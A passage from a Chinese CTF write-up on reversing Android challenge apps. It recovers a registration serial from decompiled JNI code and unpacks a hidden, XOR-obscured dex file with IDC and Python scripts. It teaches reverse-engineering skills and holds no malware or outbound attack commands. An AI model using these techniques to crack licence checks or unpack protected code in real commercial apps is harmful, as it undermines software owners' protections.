=&gt; 您的注册码已保存 | PositiveButton =&gt; 好吧                    public void onClick(DialogInterface dialog, int which) {                        Process.killProcess(Process.myPid());                    }                }).show();            }        });    }}</code></pre><p>那么基本上就是求出正确的 SN 了。在 Native 查看，发现函数在 JNI_OnLoad 中动态注册：</p><pre><code class="cpp">signed int __fastcall JNI_OnLoad(_JavaVM *a1){  if ( a1-&gt;functions-&gt;GetEnv(&amp;a1-&gt;functions, (void **)&amp;g_env, 65542) )    return -1;  _android_log_print(2, &quot;com.gdufs.xman&quot;, &quot;JNI_OnLoad()&quot;);  native_class = (int)g_env-&gt;functions-&gt;FindClass(&amp;g_env-&gt;functions, &quot;com/gdufs/xman/MyApp&quot;);  if ( !g_env-&gt;functions-&gt;RegisterNatives(&amp;g_env-&gt;functions, (jclass)native_class, (const JNINativeMethod *)gMethods, 3) )// register 3 methods  {    _android_log_print(2, &quot;com.gdufs.xman&quot;, &quot;RegisterNatives() --&gt; nativeMethod() ok&quot;);    return 65542;  }  _android_log_print(6, &quot;com.gdufs.xman&quot;, &quot;RegisterNatives() --&gt; nativeMethod() failed&quot;);  return -1;}</code></pre><p>先来看 initSN，其中读取 <code>/sdcard/reg.dat</code> 中的内容并和 <code>EoPAoY62@ElRD</code> 进行比较：</p><pre><code class="cpp">void __fastcall initSN(_JNIEnv *a1){  _JNIEnv *env; // r6  FILE *f; // r0  FILE *f_1; // r4  _JNIEnv *env_1; // r0  int v5; // r1  int len; // r7  char *data; // r5  _JNIEnv *env_2; // r0  int v9; // r1  env = a1;  f = fopen(&quot;/sdcard/reg.dat&quot;, &quot;r+&quot;);  f_1 = f;  if ( !f )                                     // read file error  {    env_1 = env;    v5 = (int)f_1;LABEL_5:    setValue(env_1, v5);    return;  }  fseek(f, 0, 2);                               // seek to file end ( SEEK_END )  len = ftell(f_1);  data = (char *)malloc(len + 1);               // malloc error  if ( !data )  {    fclose(f_1);    env_1 = env;    v5 = 0;    goto LABEL_5;  }  fseek(f_1, 0, 0);                             // seek to file start ( SEEK_SET )  fread(data, len, 1u, f_1);  data[len] = 0;  if ( !strcmp(data, &quot;EoPAoY62@ElRD&quot;) )  {    env_2 = env;    v9 = 1;  }  else  {    env_2 = env;    v9 = 0;  }  setValue(env_2, v9);  j_fclose(f_1);}</code></pre><p>其中看到有一个 setValue 函数，将 m 的值设为指定的值：</p><pre><code class="cpp">void __fastcall setValue(_JNIEnv *a1, int val){  int val_1; // r7  _JNIEnv *v3; // r4  jclass v4; // r0  void *v5; // r5  struct _jfieldID *v6; // r0  val_1 = val;  v3 = a1;  v4 = a1-&gt;functions-&gt;FindClass(&amp;a1-&gt;functions, &quot;com/gdufs/xman/MyApp&quot;);  v5 = v4;  v6 = v3-&gt;functions-&gt;GetStaticFieldID(&amp;v3-&gt;functions, v4, &quot;m&quot;, &quot;I&quot;);  v3-&gt;functions-&gt;SetStaticIntField(&amp;v3-&gt;functions, v5, v6, val_1);// set m = val}</code></pre><p>接下来看 saveSN，这里做一个循环，将 reg.dat 中的字符串取出来并和 key 进行异或：</p><pre><code class="cpp">int __fastcall saveSN(_JNIEnv *a1, int a2, jstring a3){  _JNIEnv *env; // r6  jstring str; // r9  FILE *v5; // r7  int *v7; // r4  const char *v8; // r3  int v9; // r0  int v10; // r1  _WORD *v11; // r5  JNIEnv *v12; // r0  int i; // r4  const struct JNINativeInterface *v14; // r3  signed int j; // r6  const char *utf_string; // r9  const char *data; // r5  signed int len; // r10  char val; // r2  char tmp; // r3  int v21; // [sp+0h] [bp-38h]  int v22; // [sp+14h] [bp-24h]  char v23; // [sp+18h] [bp-20h]  env = a1;  str = a3;  f = fopen(&quot;/sdcard/reg.dat&quot;, &quot;w+&quot;);  if ( f )  {    v7 = &amp;v21;    v8 = &quot;W3_arE_whO_we_ARE&quot;;    do    {      v9 = *(_DWORD *)v8;      v8 += 8;      v10 = *((_DWORD *)v8 - 1);      *v7 = v9;      v7[1] = v10;      v11 = v7 + 2;      v7 += 2;    }    while ( v8 != &quot;E&quot; );    v12 = &amp;env-&gt;functions;    i = 2016;    *v11 = *(_WORD *)v8;    v14 = env-&gt;functions;    j = 0;    utf_string = v14-&gt;GetStringUTFChars(v12, str, 0);    data = utf_string;    len = strlen(utf_string);    while ( j &lt; len )    {      if ( j % 3 == 1 )      {        i = (i + 5) % 16;        val = *(&amp;v23 + i - 23);                 // &amp;v23 - 32 = &amp;&quot;3_arE_whO_we_ARE&quot;      }      else if ( j % 3 == 2 )      {        i = (i + 7) % 15;        val = *(&amp;v23 + i - 22);                 // &amp;v23 - 22 = &amp;&quot;_arE_whO_we_ARE&quot;      }      else      {        i = (i + 3) % 13;        val = *(&amp;v23 + i - 21);                 // &amp;v23 - 21 = &amp;&quot;arE_whO_we_ARE&quot;      }      tmp = *data;      ++j;      *((_BYTE *)++data - 1) = tmp ^ val;    }    fputs(utf_string, f);  }  else if ( v22 == _stack_chk_guard )  {    return j___android_log_print(3, &quot;com.gdufs.xman&quot;, &amp;unk_2DCA);  }  return j_fclose(f);}</code></pre><p>work 函数中初始化了 SN，获取了 m 的值，并最后调用 callWork：</p><pre><code class="cpp">void __fastcall work(_JNIEnv *a1){  _JNIEnv *env; // r4  jint m; // r0  _JNIEnv *env_1; // r0  void *v4; // r1  bool v5; // zf  env = a1;  initSN(a1);  m = getValue(env);  if ( m )  {    v5 = m == 1;    env_1 = env;    if ( v5 )      v4 = &amp;unk_2E6B;                           // [0xE8, 0xBE, 0x93, 0xE5, 0x85, 0xA5, 0xE5, 0x8D, 0xB3, 0xE6, 0x98, 0xAF, 0x66, 0x6C, 0x61, 0x67, 0x2C, 0xE6, 0xA0, 0xBC, 0xE5, 0xBC, 0x8F, 0xE4, 0xB8, 0xBA, 0x78, 0x6D, 0x61, 0x6E, 0x7B, 0xE2, 0x80, 0xA6, 0xE2, 0x80, 0xA6, 0x7D, 0xEF, 0xBC, 0x81]    else      v4 = &amp;unk_2E95;                           // [0xE7, 0x8A, 0xB6, 0xE6, 0x80, 0x81, 0xE4, 0xB8, 0x8D, 0xE5, 0xA4, 0xAA, 0xE5, 0xAF, 0xB9, 0xE3, 0x80, 0x82, 0xE3, 0x80, 0x82]  }  else  {    env_1 = env;    v4 = &amp;unk_2E5B;                             // [0xE8, 0xBF, 0x98, 0xE4, 0xB8, 0x8D, 0xE8, 0xA1, 0x8C, 0xE5, 0x91, 0xA2, 0xEF, 0xBC, 0x81]  }  callWork(env_1, (int)v4);}</code></pre><p>其中 getValue 就是获取 m 的值：</p><pre><code class="cpp">jint __fastcall getValue(_JNIEnv *a1){  _JNIEnv *v1; // r4  jclass v2; // r0  void *v3; // r5  struct _jfieldID *v4; // r0  v1 = a1;  v2 = a1-&gt;functions-&gt;FindClass(&amp;a1-&gt;functions, &quot;com/gdufs/xman/MyApp&quot;);  v3 = v2;  v4 = v1-&gt;functions-&gt;GetStaticFieldID(&amp;v1-&gt;functions, v2, &quot;m&quot;, &quot;I&quot;);  return v1-&gt;functions-&gt;GetStaticIntField(&amp;v1-&gt;functions, v3, v4);// get m&#39;s value}</code></pre><p>callWork 中就是调用了 work 函数，这样看来是个死循环：</p><pre><code class="cpp">void __fastcall callWork(_JNIEnv *a1, void *a2){  const char *v2; // r8  _JNIEnv *env; // r4  jclass v4; // r0  void *v5; // r5  struct _jmethodID *v6; // r0  jobject v7; // r7  struct _jmethodID *v8; // r5  void (*v9)(JNIEnv *, jobject, jmethodID, ...); // r6  jstring v10; // r0  v2 = (const char *)a2;  env = a1;  v4 = a1-&gt;functions-&gt;FindClass(&amp;a1-&gt;functions, &quot;com/gdufs/xman/MainActivity&quot;);  v5 = v4;  v6 = env-&gt;functions-&gt;GetMethodID(&amp;env-&gt;functions, v4, &quot;&lt;init&gt;&quot;, &quot;()V&quot;);  v7 = env-&gt;functions-&gt;NewObject(&amp;env-&gt;functions, v5, v6);  v8 = env-&gt;functions-&gt;GetMethodID(&amp;env-&gt;functions, v5, &quot;work&quot;, &quot;(Ljava/lang/String;)V&quot;);  if ( v8 )  {    v9 = env-&gt;functions-&gt;CallVoidMethod;    v10 = env-&gt;functions-&gt;NewStringUTF(&amp;env-&gt;functions, v2);    v9(&amp;env-&gt;functions, v7, v8, v10);  }}</code></pre><p>在 saveSN 中其实就是实际的算法，逆一下实现解 SN 脚本：</p><pre><code class="python">#!/usr/bin/env pythonciphertext = &#39;EoPAoY62@ElRD&#39;key = &#39;W3_arE_whO_we_ARE&#39;i = 2016j = 0l = len(ciphertext)result = &#39;&#39;while j &lt; l:    if j % 3 == 1:        i = (i + 5) % 16        val = ord(key[i + 1])    elif j % 3 ==2:        i = (i + 7) % 15        val = ord(key[i + 2])    else:        i = (i + 3) % 13        val = ord(key[i + 3])    result += chr(ord(ciphertext[j]) ^ val)    j += 1print result</code></pre><h1 id="easy-dex"><a href="#easy-dex" class="headerlink" title="easy-dex"></a>easy-dex</h1><p>首先查看 AndroidManifest.xml，发现启动 Activity 为 <code>android.app.NativeActivity</code>，是在 Native 层实现的安卓 Activity：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;manifest android:versionCode=&quot;1&quot; android:versionName=&quot;1.0&quot; package=&quot;com.a.sample.findmydex&quot; platformBuildVersionCode=&quot;24&quot; platformBuildVersionName=&quot;7.0&quot; xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;&gt;  &lt;uses-sdk android:minSdkVersion=&quot;19&quot; android:targetSdkVersion=&quot;24&quot; /&gt;  &lt;application android:allowBackup=&quot;false&quot; android:fullBackupContent=&quot;false&quot; android:hasCode=&quot;false&quot; android:icon=&quot;@mipmap/ic_launcher&quot; android:label=&quot;@string/app_name&quot; android:theme=&quot;@style/AppTheme&quot;&gt;    &lt;activity android:configChanges=&quot;0xa0&quot; android:label=&quot;@string/app_name&quot; android:name=&quot;android.app.NativeActivity&quot;&gt;      &lt;meta-data android:name=&quot;android.app.lib_name&quot; android:value=&quot;native&quot; /&gt;      &lt;intent-filter&gt;        &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt;        &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt;      &lt;/intent-filter&gt;    &lt;/activity&gt;    &lt;activity android:name=&quot;com.a.sample.findmydex.MainActivity&quot;&gt;      &lt;intent-filter&gt;        &lt;action android:name=&quot;com.a.sample.findmydex.MAIN&quot; /&gt;        &lt;category android:name=&quot;android.intent.category.DEFAULT&quot; /&gt;      &lt;/intent-filter&gt;    &lt;/activity&gt;  &lt;/application&gt;&lt;/manifest&gt;</code></pre><p>看了一下 Java 只有一个类：</p><pre><code class="java">class Placeholder {    Placeholder() {        super();    }}</code></pre><p>先查看 NativeActivity 中的 onCreate 函数，其中在 pthread_create 里的第三个参数是对应的 MainActivity 的入口点，即 android_app_entry：</p><pre><code class="cpp">int __fastcall ANativeActivity_onCreate(_DWORD *a1, int a2, size_t a3){  _DWORD *v3; // r8  int savedState; // r10  size_t savedStateSize; // r9  int activity; // r0  __int64 v7; // r2  char *v8; // r5  void *v9; // r0  int *v10; // r0  char *v11; // r0  pthread_attr_t attr; // [sp+4h] [bp-30h]  v3 = a1;  savedState = a2;  savedStateSize = a3;  activity = *a1;  *(_DWORD *)(activity + 20) = sub_3000;  *(_DWORD *)activity = sub_305A;  *(_DWORD *)(activity + 4) = sub_3062;  *(_DWORD *)(activity + 8) = sub_306A;  *(_DWORD *)(activity + 12) = sub_30BE;  HIDWORD(v7) = sub_30EE;  *(_DWORD *)(activity + 16) = sub_30C6;  LODWORD(v7) = sub_30DE;  *(_DWORD *)(activity + 56) = sub_30CE;  *(_DWORD *)(activity + 60) = sub_30D6;  *(_QWORD *)(activity + 24) = v7;  *(_DWORD *)(activity + 40) = sub_30F4;  *(_DWORD *)(activity + 44) = sub_30FC;  *(_DWORD *)(activity + 48) = sub_3102;  v8 = (char *)malloc(0x94u);  _aeabi_memclr4();  *((_DWORD *)v8 + 3) = v3;  pthread_mutex_init((pthread_mutex_t *)(v8 + 64), 0);  pthread_cond_init((pthread_cond_t *)(v8 + 68), 0);  if ( savedState )  {    v9 = malloc(savedStateSize);    *((_DWORD *)v8 + 5) = v9;    *((_DWORD *)v8 + 6) = savedStateSize;    _aeabi_memcpy(v9, savedState, savedStateSize);  }  if ( pipe(&amp;attr.__align + 6) )  {    v10 = (int *)_errno();    v11 = strerror(*v10);    _android_log_print(6, &quot;threaded_app&quot;, &quot;could not create pipe: %s&quot;, v11);    v8 = 0;  }  else  {    *((_QWORD *)v8 + 9) = *((_QWORD *)&amp;attr.__align + 3);    pthread_attr_init(&amp;attr);    pthread_attr_setdetachstate(&amp;attr, 1);    pthread_create((pthread_t *)v8 + 20, &amp;attr, (void *(*)(void *))android_app_entry, v8);    pthread_mutex_lock((pthread_mutex_t *)(v8 + 64));    while ( !*((_DWORD *)v8 + 27) )      pthread_cond_wait((pthread_cond_t *)(v8 + 68), (pthread_mutex_t *)(v8 + 64));    pthread_mutex_unlock((pthread_mutex_t *)(v8 + 64));  }  v3[7] = v8;  return _stack_chk_guard - *(&amp;attr.__align + 8);}</code></pre><p>在 android_app_entry 中，在 android_app_destroy 上面可以找到对应的 MainActivity 函数：</p><pre><code class="cpp">int __fastcall android_app_entry(int a1){  int v1; // r4  int v2; // r1  int v3; // r5  int result; // r0  char v5; // [sp+8h] [bp-14h]  char v6; // [sp+Ah] [bp-12h]  int v7; // [sp+Ch] [bp-10h]  v1 = a1;  *(_DWORD *)(a1 + 16) = AConfiguration_new();  v2 = *(_DWORD *)(*(_DWORD *)(v1 + 12) + 32);  AConfiguration_fromAssetManager();  AConfiguration_getLanguage(*(_DWORD *)(v1 + 16), &amp;v6);  AConfiguration_getCountry(*(_DWORD *)(v1 + 16), &amp;v5);  *(_DWORD *)(v1 + 84) = 1;  *(_DWORD *)(v1 + 88) = v1;  *(_DWORD *)(v1 + 92) = sub_3344;  *(_DWORD *)(v1 + 96) = 2;  *(_DWORD *)(v1 + 100) = v1;  *(_DWORD *)(v1 + 104) = sub_3370;  v3 = ALooper_prepare(1);  ALooper_addFd(v3, *(_DWORD *)(v1 + 72), 1, 1, 0, v1 + 84);  *(_DWORD *)(v1 + 28) = v3;  pthread_mutex_lock((pthread_mutex_t *)(v1 + 64));  *(_DWORD *)(v1 + 108) = 1;  pthread_cond_broadcast((pthread_cond_t *)(v1 + 68));  pthread_mutex_unlock((pthread_mutex_t *)(v1 + 64));  j_android_main(v1);  android_app_destroy(v1);  pthread_mutex_lock((pthread_mutex_t *)(v1 + 64));  if ( *(_DWORD *)(v1 + 32) )    AInputQueue_detachLooper();  AConfiguration_delete(*(_DWORD *)(v1 + 16));  *(_DWORD *)(v1 + 116) = 1;  pthread_cond_broadcast((pthread_cond_t *)(v1 + 68));  pthread_mutex_unlock((pthread_mutex_t *)(v1 + 64));  result = _stack_chk_guard - v7;  if ( _stack_chk_guard == v7 )    result = 0;  return result;}</code></pre><p>进入 MainActivity 之后，一开始有一段异或的数据：</p><pre><code class="cpp">  *(_DWORD *)filename = 0x9D888DC6;  *(_DWORD *)&amp;filename[4] = 0x888DC688;  *(_DWORD *)&amp;filename[8] = 0x8AC6889D;  *(_DWORD *)&amp;filename[12] = 0x88C78486;  *(_DWORD *)&amp;filename[16] = 0x84889AC7;  *(_DWORD *)&amp;filename[20] = 0xC78C8599;  *(_DWORD *)&amp;filename[24] = 0x8D87808F;  *(_DWORD *)&amp;filename[28] = 0x8C8D9084;  *(_DWORD *)&amp;filename[32] = 0x808FC691;  *(_DWORD *)&amp;filename[36] = 0xC69A8C85;  *(_DWORD *)&amp;filename[40] = 0x9A88858A;  *(_DWORD *)&amp;filename[44] = 0xC79A8C9A;  *(_DWORD *)&amp;filename[48] = 0xE9918C8D;  filename[52] = 0;  *(_DWORD *)name = 0x9D888DC6;  *(_DWORD *)&amp;name[4] = 0x888DC688;  *(_DWORD *)&amp;name[8] = 0x8AC6889D;  *(_DWORD *)&amp;name[12] = 0x88C78486;  *(_DWORD *)&amp;name[16] = 0x84889AC7;  *(_DWORD *)&amp;name[20] = 0xC78C8599;  *(_DWORD *)&amp;name[24] = 0x8D87808F;  *(_DWORD *)&amp;name[28] = 0x8C8D9084;  *(_DWORD *)&amp;name[32] = 0x808FC691;  *(_DWORD *)&amp;name[36] = 0xC69A8C85;  *(_DWORD *)&amp;name[40] = 0x918C8D86;  name[46] = 0;  i = 1;  *(_WORD *)&amp;name[44] = 0xE9C6u;  filename[0] = 47;  do  {    filename[i] ^= 0xE9u;                       // filename = &#39;/data/data/com.a.sample.findmydex/files/classes.dex&#39;    ++i;  }  while ( i != 53 );  j = 1;  name[0] = 47;  do  {    name[j] ^= 0xE9u;                           // name = &#39;/data/data/com.a.sample.findmydex/files/odex/&#39;    ++j;  }  while ( j != 47 );</code></pre><p>解密一下，可以发现是生成目标 dex 文件和 odex 的路径：</p><pre><code class="python">#!/usr/bin/env pythondef word2bytes(w):    return [w &amp; 0xFF, (w &gt;&gt; 8) &amp; 0xFF, (w &gt;&gt; 16) &amp; 0xFF, w &gt;&gt; 24]def bytes2word(bs):    return bs[0] | bs[1] &lt;&lt; 8 | bs[2] &lt;&lt; 16 | bs[3] &lt;&lt; 24def words2byte(ws):    result = []    for w in ws:        temp = word2bytes(w)        for b in temp:            result.append(b)    return resultdef bytes2words(bs):    result = []    for i in range(len(bs) / 4):        temp = bytes2word(bs[4*i:4*i+4])        result.append(temp)    return resultfilename = [0x9D888DC6, 0x888DC688, 0x8AC6889D, 0x88C78486, 0x84889AC7, 0xC78C8599, 0x8D87808F, 0x8C8D9084, 0x808FC691, 0xC69A8C85, 0x9A88858A, 0xC79A8C9A, 0xE9918C8D]name = [0x9D888DC6, 0x888DC688, 0x8AC6889D, 0x88C78486, 0x84889AC7, 0xC78C8599, 0x8D87808F, 0x8C8D9084, 0x808FC691, 0xC69A8C85, 0x918C8D86, 0x0000E9C6]filename = words2byte(filename)name = words2byte(name)filename = chr(47) + &#39;&#39;.join(list(map(lambda c: chr(c ^ 0xE9), filename[1:])))name = chr(47) + &#39;&#39;.join(list(map(lambda c: chr(c ^ 0xE9), name[1:])))print filename# /data/data/com.a.sample.findmydex/files/classes.dexprint name# /data/data/com.a.sample.findmydex/files/odex/</code></pre><p>然后接下来，可以看到一些涉及到 OpenGL 库的函数：</p><pre><code class="cpp">...  _android_log_print(4, &quot;FindMyDex&quot;, &quot;Can you shake your phone 100 times in 10 seconds?&quot;);  v10 = 0;  do  {    while ( 1 )    {      v12 = 0;      if ( !v30 )        v12 = -1;      v13 = ALooper_pollAll(v12, 0, &amp;v25, &amp;v24);// get time      if ( v13 &gt;= 0 )        break;      if ( v30 )      {        v11 = v31 + 0.01;        if ( (float)(v31 + 0.01) &gt; 1.0 )          v11 = 0.0;        v31 = v11;        sub_2C14((int)&amp;v26);                    // OpenGL      }    }...int __fastcall sub_2C14(int a1){  int v1; // r4  int result; // r0  v1 = a1;  result = *(_DWORD *)(a1 + 20);  if ( !result )    return result;  glClearColor(    (float)*(signed int *)(v1 + 44) / (float)*(signed int *)(v1 + 32),// red    *(GLclampf *)(v1 + 40),                     // green    (float)*(signed int *)(v1 + 48) / (float)*(signed int *)(v1 + 36),// blue    1.0);  glClear(0x4000u);  result = j_eglSwapBuffers(*(_QWORD *)(v1 + 20), *(_QWORD *)(v1 + 20) &gt;&gt; 32);  return result;}</code></pre><p>这部分不去仔细看，可以直接根据 log 来判断程序的流程，可以判断出是要求在 10 秒内摇 100 次手机。在 <code>(times - 1) &lt;= 88</code> 处可以看到开始对数据进行解压缩处理。在后面 <code>times == 100</code>，可以判断是达到了 100 次后，开始对将数据输出到文件中：</p><pre><code class="cpp">...  _android_log_print(4, &quot;FindMyDex&quot;, &quot;Can you shake your phone 100 times in 10 seconds?&quot;);...            _android_log_print(4, &quot;FindMyDex&quot;, &quot;Oh yeah~ You Got it~ %d times to go~&quot;, 99 - v10);...        if ( (unsigned int)(times - 1) &lt;= 88 )        {          v10 = times;          v15 = times / 10;          if ( times % 10 == 9 )          {            v16 = size_1;            v17 = (signed int)size_1 / 10;            v18 = (v15 + 1) * ((signed int)size_1 / 10);            if ( (signed int)size_1 / 10 * v15 &lt; v18 )            {              v19 = &amp;data[v17 * v15];              do              {                --v17;                *v19++ ^= times;              }              while ( v17 );            }            if ( times == 89 )            {              while ( v18 &lt; (signed int)v16 )                data[v18++] ^= 0x59u;            }            v10 = times + 1;          }        }        if ( times == 100 )                     // reach the target        {          if ( (signed int)(time(0) - v6) &gt; 9 )          {            _android_log_print(4, &quot;FindMyDex&quot;, &quot;OH~ You are too slow. Please try again&quot;);            _aeabi_memcpy(data, &amp;data_1, size_1);            v10 = 0;          }          else          {            v20 = v6;            if ( uncompress(dest, &amp;destLen, data, (uLong)size_1) )// uncompress data              _android_log_print(5, &quot;FindMyDex&quot;, &quot;Dangerous operation detected.&quot;);            v21 = open(filename, 577, 511);            if ( !v21 )              _android_log_print(5, &quot;FindMyDex&quot;, &quot;Something wrong with the permission.&quot;);            write(v21, dest, destLen);            close(v21);            free(dest);            free(data);            if ( access(name, 0) &amp;&amp; mkdir(name, 0x1FFu) )              _android_log_print(5, &quot;FindMyDex&quot;, &quot;Something wrong with the permission..&quot;);            sub_2368((int)v1);            remove(filename);            _android_log_print(4, &quot;FindMyDex&quot;, &quot;Congratulations!! You made it!&quot;);            sub_2250(v1);            v10 = 0x80000000;            v6 = v20;          }        }      }    }...</code></pre><p>用 IDC 脚本把数据 dump 下来：</p><pre><code class="cpp">static main() {    auto fp, start, end, len, b;    fp = fopen(&quot;dump.data&quot;, &quot;wb&quot;);    start = 0x7004;    len = 0x3CA10;    end = start + len;    for (b = start; b &lt; end; b++) {        fputc(Byte(b), fp);    }}</code></pre><p>然后实现一下对 dex 文件的解压缩过程：</p><pre><code class="python">#!/usr/bin/env pythonimport zlibwith open(&#39;dump.data&#39;, &#39;rb&#39;) as f:    data = f.read()data = [ord(c) for c in data]size = 0x3CA10for times in range(90):    v15 = times / 10    if times % 10 == 9:        v16 = size        v17 = size / 10        v18 = (v15 + 1) * (size / 10)        if size / 10 * v15 &lt; v18:            for i in range(v17):                data[v17 * v15 + i] ^= times        if times == 89:            while v18 - v16 &lt; 0:                data[v18] ^= 0x59                v18 += 1data = &#39;&#39;.join([chr(c) for c in data])data = zlib.decompress(data)with open(&#39;dump.dex&#39;, &#39;wb&#39;) as f:    for c in data:        f.write(c)</code></pre><p>接下来用 JEB 对 dex 文件进行分析。首先在 MainActivity 中，变量 m 是密文，onCreate 中调用了 a 类。函数 b 则是一个加密函数，其中涉及到了 b 类中函数：</p><pre><code class="java">package com.a.sample.findmydex;import android.content.Context;import android.os.Bundle;import android.support.v7.a.u;import java.io.BufferedInputStream;import java.io.ByteArrayInputStream;import java.nio.ByteBuffer;import java.util.ArrayList;public class MainActivity extends u {    private static byte[] m;    static {        MainActivity.m = new byte[]{-120, 77, -14, -38, 17, 5, -42, 44, -32, 109, 85, 0x1F, 24, -91, -112, -83, 0x40, -83, -128, 84, 5, -94, -98, -30, 18, 70, -26, 71, 5, -99, -62, -58, 0x75, 29, -44, 6, 0x70, -4, 81, 84, 9, 22, -51, 0x5F, -34, 12, 0x2F, 77};    }    public MainActivity() {        super();    }    static byte[] a(String arg1, String arg2) {        return MainActivity.b(arg1, arg2);    }    private static byte[] b(String arg7, String arg8) {        byte[] v0_1;        try {            BufferedInputStream v2 = new BufferedInputStream(new ByteArrayInputStream(arg7.getBytes()));            byte[] v1 = new byte[16];            ArrayList v3 = new ArrayList();            Object v4 = b.a(arg8.getBytes()); // 处理密钥            while(v2.read(v1, 0, 16) != -1) { // 循环加密，采用ECB模式                v3.add(b.a(v1, 0, v4));                v1 = new byte[16];            }            ByteBuffer v2_1 = ByteBuffer.allocate(v3.size() * 16); // 转换成字节数组            Object[] v3_1 = v3.toArray();            int v4_1 = v3_1.length;            int v1_1;            for(v1_1 = 0; v1_1 &lt; v4_1; ++v1_1) {                v2_1.put(v3_1[v1_1]);            }            v0_1 = v2_1.array();        }        catch(Exception v0) {            v0_1 = new byte[1];        }        return v0_1;    }    static byte[] i() { // Cipheretxt        return MainActivity.m;    }    protected void onCreate(Bundle arg4) {        super.onCreate(arg4);        this.setContentView(0x7F04001A); // activity_main        this.findViewById(0x7F0B0055).setOnClickListener(new a(this, this.findViewById(0x7F0B0054), ((Context)this))); // button | edit_text    }}</code></pre><p>类 a 中设置了一个监听按钮的事件，并将输入和指定的字符串作为参数传入 MainActivity 的函数 a。并与密文进行比较：</p><pre><code class="java">package com.a.sample.findmydex;import android.content.Context;import android.view.View$OnClickListener;import android.view.View;import android.widget.EditText;import android.widget.Toast;import java.util.Arrays;class a implements View$OnClickListener {    a(MainActivity arg1, EditText arg2, Context arg3) {        this.c = arg1;        this.a = arg2;        this.b = arg3;        super();    }    public void onClick(View arg5) {        if(Arrays.equals(MainActivity.a(this.a.getText().toString(), this.c.getString(0x7F060023)), MainActivity.i())) { // I have a male fish and a female fish.            Toast.makeText(this.b, this.c.getString(0x7F060025), 1).show(); // Yes! You got me! :)        }        else {            Toast.makeText(this.b, this.c.getString(0x7F060022), 1).show(); // NO~ You don&#39;t get me~ T_T        }    }}</code></pre><p>b 类的 a 函数主要将数组的长度补齐成 8 的倍数，并调用 b 函数：</p><pre><code class="java">    public static Object a(byte[] arg5) { // 补齐块        Object v0_3;        int v1 = 0x20;        int v0 = 0;        Class v2 = b.class;        __monitor_enter(v2);        try {            if(arg5.length &gt; v1 || arg5.length % 8 != 0) { // 长度大于32或不是8的倍数                if(arg5.length &lt;= v1) {                    v1 = arg5.length;                }                if((v1 &amp; 7) &gt; 0) { // 判断数组长度是否是8的倍数，不是的话补齐                    v0 = 1;                }                byte[] v0_2 = new byte[v0 * 8 + v1];                System.arraycopy(arg5, 0, v0_2, 0, v1);                arg5 = v0_2;            }            v0_3 = b.b(arg5);        }        catch(Throwable v0_1) {            __monitor_exit(v2);            throw v0_1;        }        __monitor_exit(v2);        return v0_3;    }</code></pre><p>b 类中的 b 函数是一个处理密钥的函数：</p><pre><code class="java">    private static Object b(byte[] arg19) { // 处理密钥        Object[] v1_2;        int[] v13;        int v10_1;        int v9_1;        int v8_1;        int[] v11_1;        int v12;        int v3;        int v1_1;        int v5;        int v4;        Class v6 = b.class;        __monitor_enter(v6);        if(arg19 != null) {            goto label_10;        }        try {            throw new InvalidKeyException(&quot;Empty key&quot;);        label_10:            v4 = arg19.length;            if(v4 != 8 &amp;&amp; v4 != 16 &amp;&amp; v4 != 24 &amp;&amp; v4 != 0x20) {                throw new InvalidKeyException(&quot;Incorrect key length&quot;);            }            int v7 = v4 / 8;            v5 = 40;            int[] v8 = new int[4];            int[] v9 = new int[4];            int[] v10 = new int[4];            v1_1 = 0;            v3 = 0;            int v2;            for(v2 = v7 - 1; v3 &lt; 4; --v2) {                if(v1_1 &gt;= v4) {                    break;                }                int v11 = v1_1 + 1;                v12 = v11 + 1;                v1_1 = arg19[v1_1] &amp; 0xFF | (arg19[v11] &amp; 0xFF) &lt;&lt; 8;                v11 = v12 + 1;                v1_1 |= (arg19[v12] &amp; 0xFF) &lt;&lt; 16;                v12 = v11 + 1;                v8[v3] = v1_1 | (arg19[v11] &amp; 0xFF) &lt;&lt; 24;                v1_1 = v12 + 1;                v11 = arg19[v12] &amp; 0xFF;                v12 = v1_1 + 1;                v1_1 = (arg19[v1_1] &amp; 0xFF) &lt;&lt; 8 | v11;                v11 = v12 + 1;                v12 = (arg19[v12] &amp; 0xFF) &lt;&lt; 16 | v1_1;                v1_1 = v11 + 1;                v9[v3] = (arg19[v11] &amp; 0xFF) &lt;&lt; 24 | v12;                v10[v2] = b.a(v8[v3], v9[v3]);                ++v3;            }            v11_1 = new int[v5];            v1_1 = 0;            v2 = 0;            while(v2 &lt; 20) {                v3 = b.a(v7, v1_1, v8);                v4 = b.a(v7, 0x1010101 + v1_1, v9);                v4 = v4 &gt;&gt;&gt; 24 | v4 &lt;&lt; 8;                v3 += v4;                v11_1[v2 * 2] = v3;                v3 += v4;                v11_1[v2 * 2 + 1] = v3 &gt;&gt;&gt; 23 | v3 &lt;&lt; 9;                ++v2;                v1_1 += 0x2020202;            }            v8_1 = v10[0];            v9_1 = v10[1];            v12 = v10[2];            v10_1 = v10[3];            v13 = new int[0x400];            v2 = 0;            while(true) {            label_120:                if(v2 &gt;= 0x100) {                    goto label_324;                }                switch(v7 &amp; 3) {                    case 0: {                        goto label_183;                    }                    case 1: {                        goto label_126;                    }                    case 2: {                        goto label_332;                    }                    case 3: {                        goto label_337;                    }                }                goto label_124;            }        }        catch(Throwable v1) {            goto label_8;        }    label_337:        v1_1 = v2;        v3 = v2;        v4 = v2;        v5 = v2;        goto label_211;        try {        label_183:            v5 = b.a[1][v2] &amp; 0xFF ^ b.e(v10_1);            v4 = b.a[0][v2] &amp; 0xFF ^ b.f(v10_1);            v3 = b.g(v10_1) ^ b.a[0][v2] &amp; 0xFF;            v1_1 = b.a[1][v2] &amp; 0xFF ^ b.h(v10_1);        label_211:            v5 = b.a[1][v5] &amp; 0xFF ^ b.e(v12);            v4 = b.a[1][v4] &amp; 0xFF ^ b.f(v12);            v3 = b.a[0][v3] &amp; 0xFF ^ b.g(v12);            v1_1 = b.a[0][v1_1] &amp; 0xFF ^ b.h(v12);            goto label_239;        }        catch(Throwable v1) {            goto label_8;        }    label_332:        v1_1 = v2;        v3 = v2;        v4 = v2;        v5 = v2;        try {        label_239:            v13[v2 * 2] = b.b[0][b.a[0][b.a[0][v5] &amp; 0xFF ^ b.e(v9_1)] &amp; 0xFF ^ b.e(v8_1)];            v13[v2 * 2 + 1] = b.b[1][b.a[0][b.a[1][v4] &amp; 0xFF ^ b.f(v9_1)] 